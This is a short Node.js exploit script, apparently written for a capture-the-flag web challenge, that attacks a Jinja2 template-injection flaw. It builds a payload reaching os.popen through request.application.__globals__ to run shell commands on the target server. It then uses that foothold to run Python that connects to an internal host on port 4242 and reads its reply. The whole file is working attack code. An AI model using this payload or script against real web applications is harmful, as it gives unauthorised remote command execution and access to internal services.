#!/bin/env node

import axios from 'axios'

const url = 'https://ssti4.secu-web.blackfoot.dev'

function makeCmd(cmd, stderr=true, printSafe=true) {
	if (stderr) {
		cmd += ' 2>&1 | cat'
	}

	const safe = printSafe ? "|safe" : ""

	return encodeURIComponent(`{{request.application.__globals__.__builtins__.__import__("os").popen("${cmd}").read()${safe}}}`)
}

async function runCmd(cmd, stderr=true, printSafe=true) {
	const res = await axios({
		method: 'get',
		url: `${url}?username=${makeCmd(cmd, stderr)}`
	})

	const match = res.data.match(/Hello '(.*)'/s)
	return match[1]
}

async function runPython(cmd, stderr=true, printSafe=true) {
	return await runCmd(`python -c \\"${cmd}\\"`)
}

async function main() { 
	// https://wiki.python.org/moin/TcpCommunication
	const res = await runPython(`
import socket

TCP_IP = 'toto8042'
TCP_PORT = 4242
BUFFER_SIZE = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
data = s.recv(BUFFER_SIZE)
s.close()

print(data.decode('utf-8'))
`)
	console.log(res)
}

main()
